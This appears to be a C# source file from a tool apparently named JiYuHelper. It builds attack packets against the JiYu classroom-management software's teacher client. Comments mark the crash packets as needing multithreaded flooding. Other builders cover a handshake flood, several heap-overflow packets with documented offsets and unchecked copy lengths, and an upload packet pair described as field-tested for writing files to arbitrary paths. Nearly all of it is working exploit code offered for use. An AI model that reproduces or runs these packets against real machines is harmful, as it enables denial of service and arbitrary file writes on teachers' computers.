using System;
using System.Collections.Generic;
using System.Text;

namespace JiYuHelper.Core;

/// <summary>
/// 极域协议包构造器
/// 基于 docs/vulnerability-report.md 与 FindTeacherIP.cpp 还原
/// </summary>
public static class PacketBuilder
{
    public const ushort ControlPort = 4806;
    public const ushort MulticastPort = 4988;
    public const ushort SessionPort = 5512; // BaseTrans 通信层 UDP 端口
    public const string MulticastGroup = "224.50.50.42";

    // ---------- 常量头 ----------

    /// <summary>WORB 握手包 (12 字节)</summary>
    public static byte[] BuildWorbPacket()
    {
        return new byte[]
        {
            0x00, 0x00, 0x01, 0x00,
            0x57, 0x4F, 0x52, 0x42,   // "WORB"
            0x00, 0x00, 0x00, 0x00
        };
    }

    /// <summary>
    /// FILESUBMIT 崩溃包 (576 字节, Frame 17 还原)
    /// </summary>
    public static byte[] BuildFileSubmitCrashPacket()
    {
        return BuildCommandCrashPacket("FILESUBMIT", 2);
    }

    /// <summary>
    /// ANSWERSHEET 崩溃包 (sub_5661e0 case2 共用崩溃点, 实测进程级崩溃)
    /// </summary>
    public static byte[] BuildAnswerSheetCrashPacket()
    {
        return BuildCommandCrashPacket("ANSWERSHEET", 2);
    }

    /// <summary>
    /// 命令层崩溃包: IFPU4 头 + 命令名 + '|' 分隔 + 文件名段 + '|' + 无终止符填充
    /// 崩溃点: TeacherMain sub_5661e0 (IMiniMediaServerCallback) 无 SEH 保护的
    ///         无界 wchar 拷贝 (arg5[0xa] / arg6[0x28])
    /// 注意: 必须多线程持续攻击, 单发会被拒绝 (RFPU 状态码 03)
    /// </summary>
    public static byte[] BuildCommandCrashPacket(string command, uint arg4, int totalLen = 576)
    {
        byte[] p = new byte[totalLen];

        p[0] = 0x00; p[1] = 0x00; p[2] = 0x01; p[3] = 0x00;
        p[4] = 0x49; p[5] = 0x46; p[6] = 0x50; p[7] = 0x55; // "IFPU"
        p[8] = 0x34; p[9] = 0x02; p[10] = 0x00; p[11] = 0x00;
        WriteUInt32(p, 0x0C, arg4);                          // 命令类型 -> sub_5661e0 arg4
        WriteUInt32(p, 0x18, 0x20);                          // 命令名偏移
        p[0x1C] = 0xe7; p[0x1D] = 0x19; p[0x1E] = 0xd3; p[0x1F] = 0xaa;
        p[0x20] = 0x19; p[0x21] = 0x81; p[0x22] = 0xda; p[0x23] = 0x01;

        // 命令名 UTF-16LE (偏移 0x2C)
        byte[] name = Encoding.Unicode.GetBytes(command);
        Array.Copy(name, 0, p, 0x2C, name.Length);
        int pos = 0x2C + name.Length;

        // '|' 分隔符
        if (pos + 2 <= totalLen) { p[pos] = 0x7C; p[pos + 1] = 0x00; pos += 2; }

        // 文件名段 "dddddddddddddddd" UTF-16LE
        byte[] fname = Encoding.Unicode.GetBytes("dddddddddddddddd");
        if (pos + fname.Length <= totalLen)
        {
            Array.Copy(fname, 0, p, pos, fname.Length);
            pos += fname.Length;
        }

        // '|' 分隔符
        if (pos + 2 <= totalLen) { p[pos] = 0x7C; p[pos + 1] = 0x00; pos += 2; }

        // 无终止符 0x66 填充 (崩溃触发源)
        for (int i = pos; i < totalLen; i++)
            p[i] = 0x66;

        return p;
    }

    /// <summary>
    /// WORB 握手轰炸包: 仅 WORB + 关闭 (重连循环由引擎控制)
    /// </summary>
    public static byte[] BuildWorbFloodPacket()
    {
        return BuildWorbPacket();
    }

    /// <summary>
    /// QRMS 事务层堆溢出包 (文件名字段超长)
    /// 结构: "QRMS" + 0x10000 + len + GUID + 载荷
    /// 教师端 CSubmitFileTransaction::ProcessRequest
    /// 从包偏移 0x3C 起无界 wchar 拷贝 -> malloc(0x60) 堆块溢出
    /// </summary>
    public static byte[] BuildQrmsOverflowPacket(int fileNameWcharLen = 200)
    {
        // 头 12 字节 + 字段区
        int fileNameOffset = 0x3C;               // 包内偏移 0x3C = 文件名
        int tailOffset = 0x7C;                   // 路径区起始

        byte[] fileName = new byte[fileNameWcharLen * 2 + 2]; // 内容 + 终止符
        for (int i = 0; i < fileNameWcharLen; i++)
            fileName[i * 2] = 0x41;              // 'A'
        fileName[fileNameWcharLen * 2] = 0x00;
        fileName[fileNameWcharLen * 2 + 1] = 0x00;

        int totalLen = tailOffset + fileName.Length;
        byte[] p = new byte[totalLen];

        byte[] magic = Encoding.ASCII.GetBytes("QRMS");
        Array.Copy(magic, 0, p, 0, 4);

        // +4: 0x00010000
        p[4] = 0x00; p[5] = 0x00; p[6] = 0x01; p[7] = 0x00;

        // +8: 长度字段
        WriteUInt32(p, 8, (uint)totalLen);

        // +0xC: GUID (16 字节, 任意值)
        byte[] guid = new byte[16];
        new Random(0x5151).NextBytes(guid);
        Array.Copy(guid, 0, p, 0x0C, 16);

        // +0x1C: Data1 / Data2 / Data3 / Data4 (载荷起始, 全 0 即可)
        // +0x2C: 客户端 ID
        // +0x30: 文件大小低  +0x34: 高  +0x38: 文件数
        // 保持默认 0, 跳过 quota 检查 (教师端 quota=0 时直接通过)

        // +0x3C: 文件名字段
        Array.Copy(fileName, 0, p, fileNameOffset, fileName.Length);

        return p;
    }

    /// <summary>
    /// RFSA 答题堆溢出包 (magic "RFSA" / DWORD 0x41534652)
    /// 教师端 CAnswerSheetTransaction::ProcessAnswerNotInMap
    /// memcpy(alloc(arg2+0xC), arg2+0x22, arg2+0x10) 大小无校验
    /// 需教师端答题功能开启
    /// </summary>
    public static byte[] BuildRfsaOverflowPacket()
    {
        // 分配大小(0xC 字段) 用 1 字节, 复制长度(0x10 字段) 用 0x400
        int totalLen = 0x1C + 0x22 + 0x400;
        byte[] p = new byte[totalLen];

        byte[] magic = Encoding.ASCII.GetBytes("RFSA");
        Array.Copy(magic, 0, p, 0, 4);

        // +0x10 (tagANSWERFRAG 内 offset): 复制长度 = 0x400
        // ProcessAnswerNotInMap 的 arg2 = 包 + 0x1C
        //   arg2+0x0C -> 包偏移 0x28 (分配大小)
        //   arg2+0x10 -> 包偏移 0x2C (复制长度)
        //   arg2+0x22 -> 包偏移 0x3E (数据)

        WriteUInt32(p, 0x28, 1);        // 分配 1 字节
        WriteUInt32(p, 0x2C, 0x400);    // 复制 0x400 字节 -> 堆溢出

        // 数据段填充
        for (int i = 0x3E; i < totalLen; i++)
            p[i] = 0x41;

        return p;
    }

    /// <summary>
    /// QDAT 文件块堆溢出包 (magic "QDAT" / DWORD 0x51444154)
    /// 教师端 CQuizFileRecverTransaction::OnReceiveComplete
    /// memcpy((块号<<10)+buf, arg2+0x24, arg2+0x20) 长度无上限
    /// </summary>
    public static byte[] BuildQdatOverflowPacket(int blockSize = 0x500)
    {
        int totalLen = 0x1C + 0x24 + blockSize;
        byte[] p = new byte[totalLen];

        byte[] magic = Encoding.ASCII.GetBytes("QDAT");
        Array.Copy(magic, 0, p, 0, 4);

        // arg2 = 包 + 0x1C
        //   arg2+0x1C -> 包偏移 0x38 (块号)
        //   arg2+0x20 -> 包偏移 0x3C (数据长度, 无上限校验)
        //   arg2+0x24 -> 包偏移 0x40 (数据)
        WriteUInt32(p, 0x38, 0);            // 块号 0 (需 < 总块数)
        WriteUInt32(p, 0x3C, (uint)blockSize); // 长度 > 1024 -> 越界写

        for (int i = 0x40; i < totalLen; i++)
            p[i] = 0x42;

        return p;
    }

    /// <summary>
    /// PGIJ 成员名堆溢出包 (magic "PGIJ" / DWORD 0x4A494750)
    /// 教师端 CGroupMemberTransaction::OnReceiveComplete
    /// malloc(0x58) 后从 arg2+0x2E 无界 wchar 拷贝
    /// 需分组功能开启
    /// </summary>
    public static byte[] BuildPgijOverflowPacket(int nameWcharLen = 120)
    {
        int nameOffset = 0x1C + 0x2E;       // 包内偏移 0x4A
        byte[] name = new byte[nameWcharLen * 2 + 2];
        for (int i = 0; i < nameWcharLen; i++)
            name[i * 2] = 0x43;              // 'C'
        name[nameWcharLen * 2] = 0x00;
        name[nameWcharLen * 2 + 1] = 0x00;

        int totalLen = nameOffset + name.Length;
        byte[] p = new byte[totalLen];

        byte[] magic = Encoding.ASCII.GetBytes("PGIJ");
        Array.Copy(magic, 0, p, 0, 4);

        // +0x26 (包内): GUID/组ID 检查字段 -> 填 0
        // 成员名从 包偏移 0x4A 开始
        Array.Copy(name, 0, p, nameOffset, name.Length);

        return p;
    }

    /// <summary>
    /// BLKC 块数据溢出包 (magic "BLKC" / DWORD 0x424C434B)
    /// 教师端 CBlockRecverTransaction::OnReceiveComplete
    /// memcpy((块号<<10)+buf, arg2+0x3C, arg2+0x38) 长度无上限
    /// </summary>
    public static byte[] BuildBlkcOverflowPacket(int blockSize = 0x500)
    {
        int totalLen = 0x1C + 0x3C + blockSize;
        byte[] p = new byte[totalLen];

        byte[] magic = Encoding.ASCII.GetBytes("BLKC");
        Array.Copy(magic, 0, p, 0, 4);

        // arg2 = 包 + 0x1C (ProcessBlock 收到的结构)
        //   arg2+0x00 -> 包 0x1C (块类型: 1=数据)
        //   arg2+0x30 -> 包 0x4C (块号)
        //   arg2+0x38 -> 包 0x54 (数据长度, 无上限)
        //   arg2+0x3C -> 包 0x58 (数据)
        WriteUInt32(p, 0x1C, 1);            // 数据块
        WriteUInt32(p, 0x4C, 0);            // 块号 0
        WriteUInt32(p, 0x54, (uint)blockSize); // 长度 > 1024 -> 越界写

        for (int i = 0x58; i < totalLen; i++)
            p[i] = 0x44;

        return p;
    }

    // ---------- IFPU+UPFB 上传攻击 (2026-08-03 实测) ----------

    /// <summary>
    /// IFPU 上传初始化包: 任意路径文件创建 + 会话建立
    /// 实测: 教师端 CAsyncFile::Open(文件名, 写模式), 无路径过滤/无确认检查
    /// </summary>
    public static byte[] BuildIfpuUploadPacket(byte[] guid, string targetFile, uint fileSize = 1024)
    {
        byte[] fname = Encoding.Unicode.GetBytes(targetFile);
        int totalLen = 0x0C + 0x20 + fname.Length + 2;
        byte[] p = new byte[totalLen];

        p[0] = 0x00; p[1] = 0x00; p[2] = 0x01; p[3] = 0x00;
        p[4] = 0x49; p[5] = 0x46; p[6] = 0x50; p[7] = 0x55; // "IFPU"
        WriteUInt32(p, 8, (uint)(totalLen - 0xC));

        int body = 0x0C;
        Array.Copy(guid, 0, p, body + 0x00, 16);        // 会话 GUID
        WriteUInt32(p, body + 0x18, fileSize);          // 文件大小
        WriteUInt32(p, body + 0x1C, 0);
        Array.Copy(fname, 0, p, body + 0x20, fname.Length); // 文件名 wchar (任意路径)

        return p;
    }

    /// <summary>
    /// UPFB 上传数据块: 写入内容 + 触发教师端进程崩溃
    /// 实测: 每次写入均崩溃 (sub_10006460 memcpy 无上限)
    /// </summary>
    public static byte[] BuildUpfbDataPacket(byte[] guid, byte[] data)
    {
        int totalLen = 0x0C + 0x14 + data.Length;
        byte[] p = new byte[totalLen];

        p[0] = 0x00; p[1] = 0x00; p[2] = 0x01; p[3] = 0x00;
        p[4] = 0x42; p[5] = 0x46; p[6] = 0x50; p[7] = 0x55; // "BFUP" (magic 0x55504642)
        WriteUInt32(p, 8, (uint)(data.Length + 8));

        int body = 0x0C;
        Array.Copy(guid, 0, p, body + 0x00, 16);          // 会话 GUID
        WriteUInt32(p, body + 0x08, (uint)(data.Length + 8)); // 数据长度
        Array.Copy(data, 0, p, body + 0x14, data.Length);  // 数据

        return p;
    }

    /// <summary>生成固定模式的会话 GUID (测试用)</summary>
    public static byte[] BuildTestGuid(byte seed = 0x50)
    {
        byte[] guid = new byte[16];
        for (int i = 0; i < 16; i++)
            guid[i] = (byte)(seed + i);
        return guid;
    }

    private static void WriteUInt32(byte[] buffer, int offset, uint value)
    {
        buffer[offset] = (byte)(value & 0xFF);
        buffer[offset + 1] = (byte)((value >> 8) & 0xFF);
        buffer[offset + 2] = (byte)((value >> 16) & 0xFF);
        buffer[offset + 3] = (byte)((value >> 24) & 0xFF);
    }
}
